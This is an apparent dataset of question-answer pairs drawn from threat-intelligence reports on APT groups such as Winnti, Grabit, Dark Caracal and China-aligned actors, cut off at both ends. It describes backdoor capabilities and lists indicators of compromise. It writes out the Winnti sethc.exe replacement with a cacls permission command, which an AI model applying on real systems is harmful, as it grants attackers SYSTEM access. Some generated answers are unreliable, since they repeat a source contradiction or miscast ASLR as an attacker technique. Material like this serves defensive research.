engineering):\nprocess_list\nkill_process\ndir_list\nsmbshare_list\nsmbshare_mount\ndir_make\nfile_delete\nfile_move\nfile_upload\nfile_open\nfile_write\nfile_close\nfile_find\nurl_download_to_file\nprocess_start\nprocess_start_and_get_output\ndll_load\ndll_call_export\nscreen_getsnapshot\nscreen_set_cursor_position\nscreen_send_input\ntcpproxy_open_connection\ntcpproxy_close_connection\nmysql_connect\nmysql_fetch\nmysql_disconnect\ndriver_tcpreplay_interact\ntcpsession_close\nquit\nA command output is compressed using Zlib and sent to the server in asynchronous mode. To summarize, it is obvious that this executable module is a backdoor, capable of taking screenshots, stealing files, downloading new\nfiles from the Internet, starting and killing processes, including interactive Windows shell commands, file search and interaction with mysql database server.\nMedium Headline: C:\\WINDOWS\\system32\\sethc.exe\nThen the module uses undocumented Windows API from SFC_OS.dll, a function called SfcFileException to update the system version of C:\\WINDOWS\\system32\\sethc.exe.\nThe file C:\\WINDOWS\\system32\\sethc.exe (SET High Contrast) is to enable the High Contrast accessibility feature in order to allow people with visual impairments to log in. SETHC is activated at logon screen with LeftAlt+LeftShift+PrintScreen key combination.\nBy replacing C:\\Windows\\SYSTEM32\\SETHC.EXE with a custom application an attacker can run an arbitrary application with SYSTEM privileges running in zero session (in separate desktop space from normal applications).\nAfter the new file replaced the system sethc.exe application, current module adjusts the privileges of sethc.exe to disable access to the file from any other application. This is achieved by calling external system tools cacls.\nReplace access rights to the files, allow everyone full access: cacls C:\\WINDOWS\\system32\\sethc.exe /c /e /p everyone:f cacls <CURRENT DIR>\\dllcache\\sethc.exe /c /e /p everyone:f\nThe dropper application has a resource section with Menu, Dialog templates and other information put by the MS Visual Studio Application Wizard. It includes default system locale from the developer's system, which is Chinese Simplified.\nThe dropped application (from resource EXEFILE) is described below as sethc.exe.\nAnswer this question: How does the Winnti malware replace the 'sethc.exe' file to gain SYSTEM privileges, and what steps does it take to secure this replacement?",
    "output": "The Winnti malware replaces the 'sethc.exe' file (used to enable the High Contrast accessibility feature) with a custom application to run an arbitrary application with SYSTEM privileges in zero session. After replacing the file, the malware adjusts the privileges of 'sethc.exe' to disable access to the file from any other application. This is achieved by calling the external system tool 'cacls' to change the access rights, allowing everyone full access to the new 'sethc.exe' file. The dropped application from the resource EXEFILE is described as 'sethc.exe', and the dropper application includes default system locale from the developer's system, which is Chinese Simplified.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Grabit APT's use of code obfuscation, encryption, and anti-analysis techniques relate to Defense Evasion?",
    "output": "Defense Evasion refers to the techniques used by adversaries to avoid detection throughout their compromise. In the case of the Grabit APT, the attackers employed various Defense Evasion techniques to evade detection. For instance, they used code obfuscation and encryption to make it difficult for analysts to understand the malware's behavior. Additionally, they implemented anti-analysis techniques such as Address Space Layout Randomization (ASLR) to hinder reverse engineering efforts. However, despite these efforts, the attackers did not adequately cover their tracks, leaving behind clear-text communication and failing to delete binaries in most cases. This suggests that while the attackers attempted to use Defense Evasion techniques, their implementation was incomplete or inconsistent, ultimately making it easier for researchers to analyze and detect their malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3.2.4. You've installed the latest antivirus solution, now let's \"protect your   network\"\nTotal Network Monitor (which is a legitimate application) was inside another sample we found, used with embedded malware for spying purposes. Offering security applications to protect against surveillance is one of the many techniques used by malware writing groups to get victims who are in desperate need for privacy to execute these dubious programs.\nAn almost fully functional version of the \"Total Network Monitor\" utility is included. What this modified version does not show is the remote connection made to a host where f system information is dumped. The actual infection is performed when first clicking on the installer, which uses obfuscation to hide all malicious activity until the \"legitimate\" tool is completely installed.\nAs with other samples reviewed, system persistence is obtained by modifying  Windows start-up registry keys. Using names such as \"Desktop Manager\" increases the likelihood for this threat to go unnoticed. However, the entry name \"empty\" or \"empty.exe\" should raise a red flag when auditing these keys.\nSmall Headline: 3.2.5. Whatsapp and Viber for PC: Instant messaging, instant infection\nAs with other samples, social engineering does all of the heavy work. Instant messaging applications for desktop operating systems have been used in the past to spread malware and it seems that Syrian malware authors have jumped on the bandwagon. In contrast to the \"Ammazon Internet Security\", these samples don't contain any graphical user interface or even an error message that will tell the victim not to worry about their security. Heading straight for system infection has proven successful for them, and using these popular application names gets the interest of a much larger audience.\nThe following screenshot shows how the application name, intended functionality and even the icon used, all work in conjunction to create a believable story for the victim. And this is not a comprehensive list, by any means. Framing and social engineering techniques are playing an essential role in all Syrian related malware threats and the trend suggests that the complexity of them will only keep on increasing.\nSmall Headline: 3.2.7. Commands and functionality\nDifferent remote administration tools have been spotted in the wild; most of them provide an extensive range of functionality to fully control infected systems. These include:\n\u2022 Keylogging\n\u2022 Capturing screenshots and webcam control.\n\u2022 Recording live sound/video.\n\u2022 Installing programs\n\u2022 Uploading/downloading files\n\u2022 File, process and registry key management\n\u2022 Remote shell\n\u2022 Executing DDoS attacks\nAmong the most popular RAT found in the samples subset is Dark Comet, a free remote administration tool that provides a comprehensive command set for the attackers to use in their malicious purposes.\nDarkComet Control panel & Functionality\nAnother RAT widely used in the Arab world is NjRAT, which includes a list of commands (see below) that can be sent from the controller to the infected system.\nSmall Headline: 3.2.8. Evolution of malware attack file numbers\nThe attackers are working on full power, and the number of attacks and malicious files being distributed is constantly increasing as they become more organized and proficient. Below is the timeline distribution for malicious files distributed during 2013-2014, based on the first time they were distributed or seen in public (Skype, Facebook, file-sharing, email, etc.).\nBelow is the timeline distribution for the collected samples based on compilation time\nThe samples details and domains list used by the attackers can be found in the Appendices 1 and 2 in the end of the document.\nSmall Headline: 3.2.9. Locations, domains and team\nThe group responsible for the attacks is using common techniques shared by many of the hacking groups around the world. They benefit from dynamic domains that can be linked to their modem devices and configured with forward functionality to a public IP address assigned by the ISP. By restarting their modems they obtain a new address, creating a dynamic infrastructure that can be easily managed. Dynamic Update Clients (DUC) on their computer devices (usually the same as the RAT server) are in charge of having the dynamic domain provider update to the newly assigned address.\nOne of the videos by one of the attackers has shown one of the group members using a TP-Link modem model TD-W8968, commonly found in SOHO environments.\nYouTube page for one of the Attackers Showing videos about their web defacements, cyber-attacks and an interview with radio channel talking about their hacking achievements\nSince the end of 2013, the group has extensively relied on a class C IP subnet, 31.9.48.0/24, provided by TARASSUL ISP (Syrian Telecommunications Establishment) for its attacks. We suspect this subnet has been allocated to the group, also an indication that they are now operational from a single location.\nIn early 2014, the group moved to an IP address in Russia (31.8.47.7), to launch multiple new attacks.\nSmall Headline: 3.2.10. Victims\nThe distribution of victims is confined only to Syria, but also reaches nearby countries.  We have observed victims of the Syrian-based malware in:\n\u2022 Syria\n\u2022 Lebanon\n\u2022 Turkey\n\u2022 Kingdom of Saudi Arabia\n\u2022 Egypt\n\u2022 Jordan\n\u2022 Palestine\n\u2022 United Arab Emirates\n\u2022 Israel\n\u2022 Morocco\n\u2022 United States\nVictims geographical distribution map\nMap showing geographical distribution of victims with zoom on the most affected areas\nBelow are snapshots taken from videos published by the attackers, showing their RAT control panel and list of victims. This shows some of the victims located in different countries.\nThe sample details and domain lists used by the attackers can be found in Appendices 1 and 2 in the end of this document.\nSmall Headline: 3.2.11. Activist Behavior\nIt is worth noting that we have seen evidence of activists trying to carry out Denial of Service attacks on the RAT domains and servers, in an effort to overwhelm their resources and cause their connections to timeout.\nThe post below shows a warning from activists about pro-government hacker attacks on Facebook pages, explaining how pro-government groups post links to Trojanized applications in order to infect users The activists announce in the post that they have spotted a C&C domain used by the Trojans and that they are attacking it to remove all hacked victims.\n\u062c\u0627\u0631\u0636 \u064a\u0631\u0627 \u0628\u0644\u0647\u0648\u0633\u062a\n\u0644\u062d\u0630\u062c \u0641\u0645\u064a\u0627 \u0639\u0644\u0636\u062d\u0627\u064a\u0627 \u0627\u0644\u0648\u062c\u0648\u062f\u064a\u0644 \u0646\u0644\u0647\u0627\u0623  \u0643\u0646\u0634\u0627\u0644\u0644\u0647\n\" translated as \"Host Attack in progress .. to  .. \" remove all hacked victims with help of god\".\nSmall Headline: Team and positions\nFrom many posts, forums and identification videos, it is clear that the group has an organized structure of teams working together, The names and positions outlined below were collected from posts on infiltrated forums or pages. They are all either nicknames or incomplete names that do not enable full identification of the attackers.\nThe Resistant Syrian Electronic Army\n\u2022 Group 1: Team Hacker and Assad Penetrations Unit\n\u2022 Group 2: Anonymous Syria Al Assad Unit\n\u2022 Group 3: Management of Electronic Monitoring and Central Tracking Unit\nBig Headline: 4. Kaspersky Lab MENA RAT Statistics\nRemote Administration Tool (RAT) Trojans are malicious programs that allow a remote \"operator\" to control a system as if he has physical access to that system. Malicious RATs are widely used by different types of cybercriminals (hacktivists, script-kiddies, and scammers) and even in some state-sponsored attacks.\nSome of the most popular RATs are detected by Kaspersky products as following:\n\u2022 Trojan.MSIL.Zapchast, also known as Njrat\n\u2022 Backdoor.Win32.Bifrose, also known as Bitfrose\n\u2022 Backdoor.Win32.Fynloski, also known as DarkComet\n\u2022 Backdoor.Win32.Xtreme, also known as Xtremrat\nThe statistics below, extracted from the Kaspersky Security Network (KSN), show the number of RAT infection attacks blocked by Kaspersky Lab products in the MENA (Middle East North Africa) region in the 2013-2014 period:\nBased on KSN world statistics, the MENA region has one of the highest numbers for RAT attacks, as shown below:\nNjRAT infection Top 10s\n\u2022 Algeria has the highest number of users facing NjRat infection for the 2013-2014 period and five countries from MENA are in the NjRat top 10\n\u2022 Algeria has the highest number of users facing Xtreme RAT infection for the 2013-2014 period and four countries from MENA are in the Xtreme RAT top 10.\n\u2022 Four countries from MENA are in the Bifrose top 10 infection list.\n\u2022 Three countries from MENA are in the DarkComent top 10.\n\nWhat role did social engineering play in the distribution of Syrian malware through instant messaging applications like WhatsApp and Viber, and why was this method effective?",
    "output": "A: Social engineering played a crucial role in the distribution of Syrian malware through instant messaging applications like WhatsApp and Viber. The attackers leveraged the popularity and trust associated with these applications to entice victims into downloading and executing malicious files. Unlike some other malware that might present a graphical user interface or error messages, these samples went straight for system infection, making them highly effective. The use of familiar application names and icons created a believable narrative for the victims, increasing the likelihood of infection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What insights can be drawn from the fact that the Grabit malware did not employ sophisticated evasion techniques in its dynamic activity, despite the complexity of its core development?",
    "output": "The fact that the Grabit malware did not employ sophisticated evasion techniques in its dynamic activity, despite the complexity of its core development, suggests a disconnect between the technical sophistication of the malware's creation and its operational deployment. This could indicate that different members of the threat actor group have varying levels of technical expertise and security awareness. Some members may be highly skilled in developing complex malware, while others responsible for deployment may not prioritize stealth and evasion. This insight highlights the importance of understanding the organizational structure and capabilities of threat actor groups to better defend against their attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Dukes leverage steganography in their November 9th post-election spear phishing attacks?",
    "output": "The Dukes hid components of the PowerDuke backdoor within PNG files using steganography. These PNG files were stored in alternate data streams (ADS) and encrypted using the Tiny Encryption Algorithm (TEA). Once executed, the backdoor existed only in memory after being loaded into rundll32.exe.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The Anthem Hack: All Roads Lead to China\nPosted February 27, 2015 by ThreatConnect Intelligence Research Team (TCIRT)[1] \u0141led under Threat Research[2].\nUPDATE: Premera Latest Healthcare Insurance Agency to be Breached[3]\nWhen news of the Anthem breach was reported on February 4th, 2015, the security industry quite understandably went wild. A breach of this magnitude was certainly unprecedented.  Naturally, many industry professionals were keenly interested in digging into this incident to see what could be uncovered, and the research team at ThreatConnect was no exception.  Thanks to our powerful API[4] and third-party partner[5] integrations, we were able to use ThreatConnect to quickly uncover a wealth of intelligence even when initially hindered by a relative lack of investigative lead information and context, a key requirement of any Threat Intelligence Platform[6] (TIP). However, before we delve into what we were able to uncover, let's brie\u0141y review the facts as they stood in the wake of the initial discovery announcement.\nBig Headline: What We Know:\nOn the morning of February 4th, 2015, several major news outlets broke the story[7] that Anthem, Inc.'s network defenses had been breached. According to a statement from Anthem's CEO[8], the company fell victim to a \"very sophisticated external cyber attack,\" and the hackers \"obtained\" the personally identi\u0141able information (PII) of approximately 80M customers.  This included social security numbers, birthdays, street addresses, phone numbers and income data \u2013 plenty of information to enable identity theft. This was a signi\u0141cant event for several reasons:\nAnthem, formerly known as Wellpoint, is the largest managed healthcare company in the Blue Cross Blue Shield Association, and by extension, one of the largest healthcare organizations in the United States.  As such, any compromise, no matter how insigni\u0141cant, would likely impact countless individuals.\nBlue Cross Blue Shield provides healthcare coverage for about half the U.S. federal workforce.  This means that their information was potentially compromised too.\nUnlike the Sony hack which was destructive in nature and meant to send a message for coercive purposes, the Anthem compromise was purportedly very covert, a fact which may suggest something about the adversary's motives.\nAs of late February 2015, there have not been any indications that the ex\u0141ltrated PII data was immediately commoditized on the black market for the purpose of enabling identity theft, as was the case in the Home Depot Breach.\nBig Headline: Filling the Gaps:\nObviously, these high-level observations do not provide cybersecurity researchers a great deal of information to work with. However, when presented within the context of a Threat Intelligence Platform (TIP), an incomplete trail of evidence can highlight intelligence gaps, a study of which can orient threat researchers towards their analytic objectives.  To this end, let's examine what we wanted to discover in the context of the Anthem breach:\nWho was responsible for the attack?\nWhat was the objective of the attack?  Was it cyber theft, an espionage operation, or something different?\nWho was targeted in the attack?  The answer to this question, obscured as it may be, would likely shed some light on the objective of the breach.\nWhat was the timeline of the activity?\nThe real power of a Threat Intelligence Platform is demonstrated when you are able to collect and maintain a robust dataset of threat indicators, both past and present, which can help orient you in the right direction in the wake of a newly discovered breach.  Even when you do not have a good deal of information to start with (for example a \u0141le hash, or an IP address), you may \u0141nd leads by pivoting through archived datasets until you uncover key pieces of the puzzle.  In the case of the Anthem breach, we were able to do just that.\nBig Headline: Anthem Themed Infrastructure & Signed Malware:\nIn September 2014, the ThreatConnect Intelligence Research Team (TCIRT)[9] observed a variant of the Derusbi APT malware family, MD5: 0A9545F9FC7A6D8596CF07A59F400FD3[10], which was signed by a valid digital signature from the Korean company DTOPTOOLZ Co. Derusbi is a family of malware used by multiple actor groups but associated exclusively with Chinese APT. TCIRT began tracking the DTOPTOOLZ signature for additional signed malware samples and memorialized them within our Threat Intelligence Platform over time.\nAnalyst Comment: The DTOPTOOLZ signature has also been observed in association with Korean Adware that is af\u0141liated with the actual DTOPTOOLZ Co. This adware should not be confused with the APT malware that is abusing the same digital signature.\nLater, in mid-November we discovered another implant that was digitally signed with the DTOPTOOLZ signature. This implant, MD5: 98721c78dfbf8a45d152a888c804427c[11], was from the \"Sakula\" (aka. Sakurel) family of malware, a known variant of the Derusbi backdoor, and was con\u0141gured to communicate with the malicious command and control (C2) domains extcitrix.we11point[.]com and www.we11point[.]com. Through our Farsight  Security passive DNS[12] integration, we uncovered that this malicious infrastructure was likely named in such a way to impersonate the legitimate Wellpoint IT infrastructure.\nPassive DNS and historic DomainTools Whois data also provided insights that helped establish an initial timeline dating back to April 2014, when the faux domains came into existence and were later operationalized by the attackers. A Threat Intelligence Platform should allow for analysts to easily put together and organize such insights, collaborate around relevant analysis internally, and share the \u0141nished analysis with external industry groups and organizations. In the hopes that our community members could bene\u0141t from or provide further insight into this suspicious incident, we immediately shared our threat intelligence including indicators, signatures and analytical context to the ThreatConnect Medical and Health Community[13] on November 13, 2014. This included sending out a noti\u0141cation to all stakeholders as well as our followers on Twitter[14].\nWhen the Anthem breach later came to light in early February, we re-shared the signatures, indicators and context freely to the entire ThreatConnect user base. As we dug further, we expanded our understanding of the malicious we11point[.]com infrastructure, taking particular interest to the subdomains such as \"extcitrix.we11point[.]com and \"hrsolutions.we11point[.]com\". Note the \"citrix\"  and \"hr\" (human resources) pre\u0141xes that the adversary used to mirror legitimate remote infrastructure and employee bene\u0141ts resources in the May 2014 timeframe. This provided initial insights as to the likely targeting themes and or vectors in which the adversary may have used when initiating their targeting campaign.\n[15]\nThe fact that the malicious infrastructure closely mirrored other legitimate Wellpoint infrastructure supported our hypothesis that the Derusbi / Sakula malware was con\u0141gured to operate and persist within a speci\u0141c target enterprise.\nBig Headline: Possible Premera Blue Cross Infrastructure:\nRetrospective analysis of other targeted malware samples using the DTOPTOOLZ Co. digital signature led to the identi\u0141cation of an \"HttpBrowser\" / \"HttpDump\" implant MD5:\n02FAB24461956458D70AEED1A028EB9C[17]\n(OpenOf\u0141cePlugin.exe), which was \u0141rst observed on December 11, 2013. Although this malware sample is not Derusbi / Sakula, it too is strongly believed to be associated with Chinese APT activity and in fact may have also been involved in a Blue Cross Blue Shield\ntargeting campaign as early as December 2013.\n[18]\nThis particular binary is con\u0141gured to connect to the static IP address 142.91.76[.]134. Passive DNS of this IP indicates that on December 11th, 2013, the same date as the malware sample was observed, the domain prennera[.]com also resolved to 142.91.76[.]134. It is believed that the prennera[.]com domain may have been impersonating the Healthcare provider Premera Blue Cross[19], where the attackers used the same character replacement technique by replacing the \"m\" with two \"n\" characters within the faux domain, the same technique that would\nbe seen \u0141ve months later with the we11point[.]com command and control infrastructure.\nRead the text above and answer this question: How did the ThreatConnect Intelligence Research Team (TCIRT) leverage their Threat Intelligence Platform (TIP) to uncover intelligence related to the Anthem breach despite limited initial information?",
    "output": "The TCIRT utilized their Threat Intelligence Platform (TIP) to collect and maintain a robust dataset of threat indicators, both past and present. By pivoting through archived datasets, they were able to uncover key pieces of the puzzle even without specific initial leads such as file hashes or IP addresses. This approach allowed them to orient their research in the right direction and ultimately uncover significant details about the Anthem breach.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: China\nMustang Panda FishMonger TA410 GREF MirrorFace GALLIUM DigitalRecyclers TheWizards PerplexedGoblin Worok\nSummary of China-aligned APT group activity seen by ESET Research in April 2023 \u2013 September 2023\nDuring the past six months, ESET researchers continued to observe several China-aligned APT groups targeting European government organizations, including Mustang Panda and a group we named DigitalRecyclers. We also observed a governmental entity in Guyana being targeted by a cluster of activity we named , a governmental entity in Kuwait and a hosting provider targeted by TA410 and, finally, a watering hole attack by FishMonger against a Pakistani government website. In the same period, MirrorFace continued to heavily target Japanese organizations. We also uncovered a China-aligned APT group, which we named TheWizards, spying on Chinese speakers in mainland China and abroad using adversary-in-the-middle (AitM) attacks. We also discovered that the Worok APT group has developed a new Go backdoor that we have named GoFighting.\nMedium Headline: Mustang Panda\nIn August, ESET researchers identified a campaign by Mustang Panda targeting a governmental organization in Slovakia. There is no indication leading us to think that this organization was successfully compromised. It is worth noting that this Mustang Panda spearphishing operation happened amidst the .\nTargets first received a spearphishing email with a tracking pixel, enabling the attacker to know when the target opens the email. A malicious link is then sent in a second email. We believe the goal is to identify users who are more likely to open phishing emails and target them specifically in order to reduce the risk of the payload being reported to IT or security services.\nThat malicious link leads to a ZIP archive containing a LNK file that downloads and executes an HTA script, which then deploys the group's . The only significant difference here being that the malicious DLL is written in . While this is the first instance we could find of Mustang Panda using Nim, it is consistent with the group's recent exploration of new programming languages and technology.\nOver the last months, we also observed Mustang Panda increasingly relying on Cloudflare to hide its actual C&C and distribution servers.\nMedium Headline: FishMonger\nIn July, ESET researchers detected a watering-hole attack on a legitimate, but presumably compromised, Pakistani government website. If the visitor is using a computer, not a smartphone, the script displays an alert\nbox (see Figure 1) and if the visitor clicks on OK, a Windows executable is downloaded onto the device.\nThe downloaded executable is a backdoor named Trochilus, which is commonly used by other China-aligned APT groups such as Webworm. However, the C&C server had typical characteristics of the ShadowPad servers deployed by FishMonger. Therefore, we believe with medium confidence that FishMonger is behind this watering-hole attack and is a Trochilus backdoor user.\nSmall Headline: FlowingFrog\nIn mid 2023, we observed activity by the FlowingFrog TA410 subgroup on the server of a US hosting provider. We detected samples of the Tendyron backdoor that were deployed after the attacker unsuccessfully tried to deploy multiple Jakarta Server Pages (JSP) web backdoors. The Tendyron backdoor and multiple variations of the JSP web backdoor were transferred to the server in quick succession.\nWe believe initial access was achieved by exploiting a known vulnerability, since the affected server was running an out-of-date version of the Adobe ColdFusion application server.\nSmall Headline: LookingFrog\nESET researchers observed activity in our telemetry by the LookingFrog TA410 subgroup on a computer belonging to a governmental entity in Kuwait. We detected a sample of the group's custom LookBack implant, along with the Stegmap backdoor and a persistence tool; both of the latter two were previously attributed to Looking Frog in a .\nThis version of LookBack is almost identical to those we described in our , while the Stegmap sample downloads a image containing the encrypted next stage encoded in the image.\nMedium Headline: GREF\nWe recently published a documenting two active campaigns targeting Android users, that we attribute to the GREF group.\nThe campaigns have distributed the Android BadBazaar espionage code through the Google Play store, Samsung Galaxy Store, and dedicated websites representing the malicious apps Signal Plus Messenger and FlyGram. The threat actors patched the open-source Signal and Telegram apps for Android with malicious code that we have identified as BadBazaar, which has previously been used to target Uyghurs and other . Based on our research, potential victims were also lured to install the malicious FlyGram app from a Uyghur Telegram group focused on Android app sharing; see Figure 2.\nThe purpose of these trojanized apps is to exfiltrate user data and, specifically in Signal Plus Messenger, to spy on victims' Signal communication. After publishing our blogpost, Volexity published a  on three Android malware families \u2013 BadBazaar, BadSignal, and BadSolar \u2013 and attributed them to a group they call EvilBamboo. More specifically, the BadSignal malware family analyzed by Volexity is what ESET has described as trojanized Signal and Telegram applications, with the added malicious code that has the same functionality as earlier BadBazaar variants . In order to avoid confusion: moving forward, we will adopt this naming convention to distinguish between the original BadBazaar, and its BadSignal variant, which is delivered via trojanized applications.\nMedium Headline: MirrorFace\nMirrorFace continued with its campaigns targeting Japanese entities exclusively. In August 2023, we observed an interesting change in the attack vector: instead of compromising an entity via the victim opening a malicious attachment to a spearphishing email, MirrorFace compromised an IT company through a vulnerable server. Our analysis of the incident indicates that the server was most likely compromised through a vulnerable instance of , an online storage service. Proself released an advisory in July 2023 stating that its products contained an authentication bypass and zero-day remote code execution vulnerability that had been confirmed to be already exploited.\nA few days after the aforementioned incident, MirrorFace continued on the same trend and once again compromised a vulnerable server, but this time of a research institute. MirrorFace delivered its flagship backdoor LODEINFO alongside various publicly available exploitation tools such as , , , , the customized reverse proxy , and a previously undescribed backdoor. This shows that MirrorFace has enriched its toolset repertoire and, besides its in-house developed malware, MirrorFace has started using publicly available exploitation tools as well.\nMedium Headline: GALLIUM\nDuring the last six months, ESET researchers have observed GALLIUM compromising telecommunications operators in Mali, T\u00fcrkiye, and French Polynesia, and a government organization in Guatemala. We discovered these campaigns while monitoring implants known to have been used by GALLIUM in the past, including the recently documented toolset used during .\nMost of the compromised systems are Microsoft Exchange servers or Microsoft IIS servers, all with numerous webshells detected; it's likely that the attackers exploited one or more of the various remote code execution vulnerabilities discovered in the past few years on these platforms, or reused already deployed webshells in order to deploy their own implants.\nOn the compromised systems, GALLIUM deployed mim221, a custom credential theft implant based on Mimikatz.\nMedium Headline: DigitalRecyclers\nESET researchers uncovered the activity of a newly identified cyberespionage group, which we have named DigitalRecyclers, that repeatedly compromised a governmental organization in the European Union since 2018, using a toolset originally developed by threat actors from Pakistan in the 2010s.\nIn a recent incident, we were able to determine that the attackers dropped a first-stage downloader through a Microsoft Exchange web server accessible from the internet. Interestingly, attackers accessed the victim's server using a custom VPN service that is also used by . The use of such custom anonymization networks is an ongoing trend among China-aligned threat actors.\nWe believe that DigitalRecyclers is loosely linked to BackdoorDiplomacy and the wider APT15 family.\nMedium Headline: TheWizards\nTheWizards is a China-aligned APT group active since at least 2021, engaging in cyberespionage operations against Chinese-speaking\nindividuals based in mainland China and abroad (e.g., the Philippines, the United Arab Emirates, and Hong Kong), and against gambling companies based outside mainland China. ESET researchers discovered this threat actor when a malicious update was downloaded by a popular, legitimate Chinese application.\nTheWizards group has capabilities to conduct adversary-in-the-middle (AitM) attacks using a custom tool we discovered and have named Spellbinder. This tool uses  to redirect traffic and deliver custom malware via software updates by legitimate applications. The tools developed by this group include two backdoors that we've named WizardNet and DarkNights.\nSince gambling is  and Chinese citizens thus , this would explain why TheWizards group spies on such companies, most likely to identify Chinese citizens infringing the law. This is not the first time we have witnessed a China-aligned APT group targeting gambling companies: Operation ChattyGoblin, which we mentioned in , compromised a gambling company in the Philippines by targeting its support agents.\n\nWhat tactics did FishMonger employ in their watering-hole attack on a Pakistani government website, and how did ESET researchers attribute this attack to FishMonger?",
    "output": "FishMonger conducted a watering-hole attack by compromising a legitimate Pakistani government website. When visitors accessed the site using a computer, an alert box prompted them to download a Windows executable. This executable was identified as the Trochilus backdoor, commonly used by other China-aligned APT groups such as Webworm. The attribution to FishMonger was based on the characteristics of the C&C server, which matched those of ShadowPad servers typically deployed by FishMonger. This combination of the Trochilus backdoor and ShadowPad server characteristics led ESET researchers to attribute the attack to FishMonger with medium confidence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nAs the modern threat landscape has evolved, so have the actors. The barrier to entry for cyber-warfare has continued to decrease, which means new nation states \u2014 previously without significant offensive capabilities1 \u2014 are now able to build and deploy widespread multi-platform cyber-espionage campaigns.\nThis report uncovers a prolific actor with nation-state level advanced persistent threat (APT) capabilities, who is exploiting targets globally across multiple platforms. The actor has been observed making use of desktop tooling, but has prioritized mobile devices as the primary attack vector. This is one of the first publicly documented mobile APT actors known to execute espionage on a global scale.\nLookout and Electronic Frontier Foundation (EFF) have discovered Dark Caracal2, a persistent and prolific actor, who at the time of writing is believed to be administered out of a building belonging to the Lebanese General Security Directorate in Beirut. At present, we have knowledge of hundreds of gigabytes of exfiltrated data, in 21+ countries, across thousands of victims. Stolen data includes enterprise intellectual property and personally identifiable information. We are releasing more than 90 indicators of compromise (IOC) associated with Dark Caracal including 11 different Android malware IOCs; 26 desktop malware IOCs across Windows, Mac, and Linux; and 60 domain/IP based IOCs.\nDark Caracal targets include individuals and entities that a nation state might typically attack, including governments, military targets, utilities, financial institutions, manufacturing companies, and defense contractors. We specifically uncovered data associated with military personnel, enterprises, medical professionals, activists, journalists, lawyers, and educational institutions during this investigation. Types of data include documents, call records, audio recordings, secure messaging client content, contact information, text messages, photos, and account data.\nThe joint Lookout-EFF investigation began after EFF released its (<https://www.eff.org/files/2016/08/03/i-got-a-letter-from-the-government.pdf>)Operation Manul report, highlighting a multi-platform espionage campaign targeted at journalists, activists, lawyers, and dissidents who were critical of President Nursultan Nazarbayev's regime in Kazakhstan. The report describes malware and tactics targeting desktop machines, with references to a possible Android component. After investigating related infrastructure and connections to Operation Manul, the team concluded that the same infrastructure is likely shared by multiple actors and is being used in a new set of campaigns.\nThe diversity of seemingly unrelated campaigns that have been carried out from this infrastructure suggests it is being used simultaneously by multiple groups. Operation Manul clearly targeted persons of interest to Kazakhstan, while Dark Caracal has given no indication of an interest in these targets or their associates. This suggests that Dark Caracal either uses or manages the infrastructure found to be hosting a number of widespread, global cyber-espionage campaigns.\nSince 2007, Lookout has investigated and tracked mobile security events across hundreds of millions of devices around the world. This mobile espionage campaign is one of the most prolific we have seen to date. Additionally, we have reason to believe the activity Lookout and EFF have directly observed represents only a small fraction of the cyber-espionage that has been conducted using this infrastructure.\n1 (<https://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf>)https://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf\n2 In keeping with traditional APT naming, we chose the name \"Caracal\" (pronounced [kar-uh-kal]) because the feline is native to Lebanon and because this group has remained hidden for so long. From the (<https://en.wikipedia.org/wiki/Caracal>)Wikipedia entry \"the caracal is highly secretive and difficult to observe\" and \"is often confused with [other breeds of cat].\" The naming further builds on EFF's \"Operation Manul,\" another feline reference. We like cats.\n\nAnswer this question based on the above context: Why did Dark Caracal prioritize mobile devices as the primary attack vector over desktop tooling? What strategic advantages does this approach provide in a global cyber-espionage campaign?",
    "output": "Dark Caracal prioritized mobile devices as the primary attack vector because mobile devices are ubiquitous and often contain a wealth of personal and professional information. This approach provides several strategic advantages. First, mobile devices are frequently used for both personal and work purposes, making them a rich source of diverse data. Second, users tend to have their mobile devices with them at all times, allowing for continuous surveillance. Lastly, mobile security measures are often less robust compared to desktop systems, making them easier targets for sophisticated APT actors like Dark Caracal.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nWhether considered advanced persistent threats (APTs) or malware-based espionage attacks, successful and long-term compromises of high-value organizations and enterprises worldwide by a consistent set of campaigns cannot be ignored. Because \"noisier\" campaigns are becoming increasingly well-known within the security community, new and smaller campaigns are beginning to emerge.\nThis research paper documents the operations of a campaign we refer to as \"Safe,\" based on the names of the malicious files used. It is an emerging and active targeted threat.\nNote that any mention of \"SafeNet\" in this paper is completely unrelated to and has no association with SafeNet, Inc., a global leader in data protection and a valued partner of Trend Micro. The author of the Safe malware apparently maliciously used the word \"SafeNet\" as part of this viral campaign, and to the extent the word \"SafeNet\" appears in this paper, it appears solely as replicated in the attacking author's malware configuration. There is no correlation between SafeNet Inc. and the Safe campaign and should not be interpreted as such.\nThe Safe campaign was able to compromise the following types of organizations:\n\u2022 Government ministries\n\u2022 Technology companies\n\u2022 Media outlets\n\u2022 Academic research institutions\n\u2022 Nongovernmental organizations\nWhile we have yet to determine the campaign's total number of victims, it appears that nearly 12,000 unique IP addresses spread over more than 100 countries were connected to two sets of command-and-control (C&C) infrastructures related to Safe. We also discovered that the average number of actual victims remained at 71 per day, with few if any changes from day to day. This indicates that the actual number of victims is far less than the number of unique IP addresses. Due to large concentrations of IP addresses within specific network blocks, it is likely that the number of victims is even smaller and that they have dynamically assigned IP addresses, which have been compromised for some time now.\nInvestigating targeted campaigns involves more than simply collecting actionable indicators like malware samples and C&C server information. Investigating and monitoring the activities of the Safe campaign over time, we were able to take advantage of the mistakes the attackers made and thus gain a deeper understanding of their operations. One of the C&C servers was set up in such a way that the contents of the directories were viewable to anyone who accessed them. As a result, not only were we able to determine who the campaign's victims were, but we were also able to download backup archives that contained the PHP source code the attackers used for the C&C server and the C code they used to generate the malware used in attacks.\nThe author of the malware used in the campaign is probably a professional software developer who studied at 